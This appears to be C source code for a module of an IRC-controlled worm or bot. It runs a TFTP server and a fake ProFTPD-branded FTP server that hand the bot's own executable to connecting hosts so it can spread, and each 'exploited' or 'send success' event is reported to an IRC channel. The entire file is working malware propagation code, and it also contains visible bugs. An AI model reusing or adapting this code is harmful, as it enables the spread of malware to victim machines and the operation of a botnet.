
#include "includes.h"
#include "extern.h"



unsigned	int	    usFtpdPort						= rand() % 64511 + 1024;
int					nFtpdTotalServed;


char *ResolveHost(const char *szRemoteAddress)
{
	char szAddress[128];
	DWORD dwAddress;
	HOSTENT* lpHostent;
	
	if (!szRemoteAddress)
		strcpy(szAddress, "");
	else
		strcpy(szAddress, szRemoteAddress);
	
	if(lpHostent = gethostbyname(szAddress))
		return inet_ntoa(*(struct in_addr *) lpHostent->h_addr_list[0]);
	
	if((dwAddress = inet_addr(szAddress)) != INADDR_NONE)
	{
		if(lpHostent = gethostbyaddr((char *)&dwAddress, sizeof(struct in_addr), AF_INET))
			return lpHostent->h_name;
	}
	
	return NULL;
}


void TFTPDHandler(LPVOID dwParam)
{
	char tstr[256];
	ds dl;
	ds *dsp = (ds *)dwParam;
	dsp ->gotinfo = TRUE;
	char szSendBuffer[MAX_PATH], szType [] = "octet", szFileBuffer[516], szRemoteIpAddress[16], szFilePath[MAX_PATH];
	int iRetVal = 1; 
	FILE* hFile;
	
	if(!(g_pThread[FindPid("TFTPDaemon")].sServerSock = socket(AF_INET, SOCK_DGRAM, 0)))
		ExitThread(0);
	
	if(!Bind(g_pThread[FindPid("TFTPDaemon")].sServerSock, 69, true))
		ExitThread(0);
	
	if(!GetModuleFileName(NULL, szFilePath, sizeof(szFilePath)) || !(hFile = fopen(szFilePath, "rb")))
		ExitThread(0);
	
	while(1)
	{ 
		TIMEVAL hTimeVal; 
		hTimeVal.tv_sec		= 5; 
		hTimeVal.tv_usec	= 5000; 
		
		fd_set hFDSET; 
		FD_ZERO(&hFDSET); 
		FD_SET(g_pThread[FindPid("TFTPDaemon")].sServerSock, &hFDSET); 
		
		memset(szSendBuffer, 0, sizeof(szSendBuffer)); 
		
		if(select(0, &hFDSET, NULL, NULL, &hTimeVal))
		{ 
			SOCKADDR_IN sinSockAddrInClient; 
			int iSockAddrLenght = sizeof(sinSockAddrInClient); 
			
			if(!(recvfrom(g_pThread[FindPid("TFTPDaemon")].sServerSock, szSendBuffer, sizeof(szSendBuffer), 0, (LPSOCKADDR)&sinSockAddrInClient, &iSockAddrLenght)))
				ExitThread(0); 
			
			_snprintf(szRemoteIpAddress, sizeof(szRemoteIpAddress), inet_ntoa(sinSockAddrInClient.sin_addr));
			
			if(szSendBuffer[0] == 0 && szSendBuffer[1] == 1) 
			{
				char *szTempRequest = szSendBuffer, *szTempType = szSendBuffer;
				
				szTempRequest	+= 2;
				szTempType		+= (strlen(filename) + 3);
				
				fseek(hFile, 0, SEEK_SET); 
				szFileBuffer[0]	= 0;
				
				szFileBuffer[1]	= 3;
				szFileBuffer[2]	= 0;
				szFileBuffer[3]	= 1;
				
				iRetVal = fread(&szFileBuffer[4], 1, 512, hFile);
				
				sendto(g_pThread[FindPid("TFTPDaemon")].sServerSock, szFileBuffer, iRetVal + 4, 0, (LPSOCKADDR)&sinSockAddrInClient, iSockAddrLenght);
			}
			else
				if(szSendBuffer[0] == 0 && szSendBuffer[1] == 4) 
				{
					BYTE BFirstPart = szSendBuffer[2], BSeccondPart = szSendBuffer[3];
					
					szFileBuffer[0]	= 0; 
					szFileBuffer[1]	= 3;
					
					if (BSeccondPart == 255) 
					{
						szFileBuffer[2]	= ++BFirstPart;
						szFileBuffer[3]	= BSeccondPart = 0;
					}
					else 
					{
						szFileBuffer[2]	= BFirstPart;
						szFileBuffer[3]	= ++BSeccondPart;
					}
					
					unsigned int iBlocks = (BFirstPart * 256) + BSeccondPart - 1; 
					
					fseek(hFile, iBlocks * 512, SEEK_SET);
					iRetVal = fread(&szFileBuffer[4], 1, 512, hFile); 
					
					sendto(g_pThread[FindPid("TFTPDaemon")].sServerSock, szFileBuffer, iRetVal + 4, 0, (LPSOCKADDR)&sinSockAddrInClient, iSockAddrLenght);
					
					if (!iRetVal) 
				sprintf(tstr, "-wormride.tftpd- exploited %s (%s) succesfully\r\n",*ResolveHost(szRemoteIpAddress), szRemoteIpAddress);
					if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);

				//	NSA->cIRC.SendData("PRIVMSG %s :-wormride.tftpd- exploited %s (%s) succesfully\r\n",ResolveHost(szRemoteIpAddress), szRemoteIpAddress);
				}
				else
					sendto(g_pThread[FindPid("TFTPDaemon")].sServerSock, "\x00\x05\x00\x04\x6B\x74\x68\x78\x00",9, 0, (LPSOCKADDR)&sinSockAddrInClient, iSockAddrLenght); 
		}
		else 
			continue;
	}
	
	DelThread(FindPid("TFTPDaemon"));
	fclose(hFile);
	ExitThread(0);
}

/* small FTPD handling routines */
SOCKET sDataSocket;

bool FtpdEstablishDataSocket(char *szRemoteIp, int iPort)
{
	struct sockaddr_in sinSockAddrIn;
	
	if(!(sDataSocket = socket(AF_INET, SOCK_STREAM, 0)))
		return false;
	
	sinSockAddrIn.sin_family		= AF_INET;
	sinSockAddrIn.sin_addr.s_addr	= inet_addr(szRemoteIp);
    sinSockAddrIn.sin_port			= htons(iPort);
	
	if (connect(sDataSocket, (LPSOCKADDR)&sinSockAddrIn, sizeof(struct sockaddr)) == SOCKET_ERROR) 
		return false;
	
	return true;
}

bool FtpdSendFile(SOCKET sSendSocket) 
{
	unsigned char szBuffer[1024];
	char szFilePath[MAX_PATH];
	FILE* hFile;
	
	if(!GetModuleFileName(NULL, szFilePath, sizeof(szFilePath)) || !(hFile = fopen(szFilePath, "rb")))
		return false;
	
	while(!feof(hFile))
	{
		fread(&szBuffer, sizeof(szBuffer), 1, hFile);
		send(sSendSocket, (const char*)szBuffer, sizeof(szBuffer), 0);
		
		Sleep(64);
	}
	
	fclose(hFile);
	return true;
}

void FtpdHandler()
{

	char tstr[256];
	ds dl;
	char szBuffer[128], szSendBuffer[128], szCommand[128], szParamter[128], szRemoteIp[128], szFtpdIp[16];
	char szPart1[4], szPart2[4], szPart3[4], szPart4[4], szPort[64], szPort1[64], szPort2[64];
	int iFDMax, iAddressLenght, iPort1, iPort2, i;
	struct fd_set hFDSETMain, hFDSETClient;
	struct sockaddr_in sinSockAddrIn;
	SOCKET sClientSock;
	long lIpAddress;
	
	FD_ZERO(&hFDSETMain);
	FD_ZERO(&hFDSETClient);
	
	if(!(g_pThread[FindPid("FTPDaemon")].sServerSock = socket(AF_INET, SOCK_STREAM, 0)))
		ExitThread(0);
	
	if(!Bind(g_pThread[FindPid("FTPDaemon")].sServerSock, usFtpdPort, false))
		ExitThread(0);
	
	FD_SET(g_pThread[FindPid("FTPDaemon")].sServerSock, &hFDSETMain);
	
	if(!(iFDMax = g_pThread[FindPid("FTPDaemon")].sServerSock))
		ExitThread(0);
	
	while(g_pThread[FindPid("FTPDaemon")].sServerSock) 
	{
		hFDSETClient = hFDSETMain;
		
		if (select(iFDMax+1, &hFDSETClient, NULL, NULL, NULL) == SOCKET_ERROR) 
			ExitThread(0);
		
		for(i = 0; i <= iFDMax; i++) 
		{
			memset(szBuffer,	0, sizeof(szBuffer));
			memset(szCommand,	0, sizeof(szCommand));
			
			if (FD_ISSET(i, &hFDSETClient)) 
			{
				if (i == (int)g_pThread[FindPid("FTPDaemon")].sServerSock) 
				{
					iAddressLenght = sizeof(sinSockAddrIn);
					
					if ((sClientSock = accept(g_pThread[FindPid("FTPDaemon")].sServerSock, (LPSOCKADDR)&sinSockAddrIn, &iAddressLenght)) != SOCKET_ERROR) 
					{
						FD_SET(sClientSock, &hFDSETMain);
						
						if ((int)sClientSock > iFDMax) 
							iFDMax = sClientSock;
						
						_snprintf(szSendBuffer, sizeof(szSendBuffer), "220 ProFTPD 1.%d.%d Server (ProFTPD Default Installation)\n", nick2(0, 2), nick2(0, 10));
						
						send(sClientSock, szSendBuffer, strlen(szSendBuffer) , 0);
					}
				} 
				else 
				{
					if(!(recv(i, szBuffer, sizeof(szBuffer), 0)))
					{
						FD_CLR((SOCKET)i, &hFDSETMain);
						closesocket(i);
					} 
					else 
					{
						sscanf(szBuffer,"%s %s", szCommand, szParamter);
						
						if(!strcmp(szCommand, "USER"))
							send(i, "331 Password required\n", 22, 0);
						else 
							if(!strcmp(szCommand, "PASS"))
								send(i, "230 User logged in.\n", 20, 0);
							else 
								if(!strcmp(szCommand, "SYST"))
									send(i, "215 UNIX Type: L8\n", 18, 0);
								else 
									if(!strcmp(szCommand, "REST"))
										send(i, "350 Restarting.\n", 16, 0);
									else 
										if(!strcmp(szCommand, "PWD"))
											send(i, "257 \"/\" is current directory.\n", 30, 0);
										else 
											if(!strcmp(szCommand, "TYPE") && !strcmp(szParamter, "A") || !strcmp(szParamter, "I"))
												send(i, "200 Type set to A.\n", 19 , 0);
											else 
												if(!strcmp(szCommand, "PASV")) 
													send(i, "425 Passive not supported on this server\n", 41, 0);
												else 
													if(!strcmp(szCommand, "LIST"))
														send(i, "226 Transfer complete\n", 22, 0);
													else 
														if(!strcmp(szCommand, "PORT")) 
														{
															sscanf(szBuffer, "%*s %[^,],%[^,],%[^,],%[^,],%[^,],%[^\n]", szPart1, szPart2, szPart3, szPart4, szPort1, szPort2);
															
															iPort1 = atoi(szPort1);
															iPort2 = atoi(szPort2);
															
															memset(szPort, 0, sizeof(szPort));
															_snprintf(szPort, sizeof(szPort), "%x%x\n", iPort1, iPort2);
															
															lIpAddress = strtoul(szPort, NULL, 16);
															
															_snprintf(szRemoteIp, sizeof(szRemoteIp), "%s.%s.%s.%s", szPart1, szPart2, szPart3, szPart4);
															send(i, "200 PORT command successful.\n", 29 , 0);
														}
														else 
															if (!strcmp(szCommand, "RETR")) 
															{
																send(i, "150 Opening BINARY mode data connection\n", 40 , 0);
																
																if(FtpdEstablishDataSocket(szRemoteIp, (int)lIpAddress))
																{
																	if(FtpdSendFile(sDataSocket))
																		send(i, "226 Transfer complete.\n", 23 , 0);
																	else
																		send(i, "425 Can't open data connection.\n", 32, 0);
																	
																	nFtpdTotalServed++;
																	
																	if(!GetSocketAddress(i, szFtpdIp))
																		strncpy(szFtpdIp, "unknown", sizeof(szFtpdIp));
																	
																	sprintf(tstr, "wormride.ftod- %d. send success to %s (%s) succesfully\r\n",nFtpdTotalServed, ResolveHost(szFtpdIp), szFtpdIp);
																	if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);
		
																	closesocket(sDataSocket);
																} 
																else 
																	send(i, "425 Can't open data connection.\n", 32, 0);
															}
															else 
																if(!strcmp(szCommand, "QUIT"))
																	send(i, "221 Goodbye.\n", 13, 0);
																else
																	send(i, "501 Option not supported.\n", 26, 0);
																
																memset(szBuffer, 0, sizeof(szBuffer));
					}
				}
			}
		}
	}
	
	
	DelThread(FindPid("FTPDaemon"));
	ExitThread(1);
}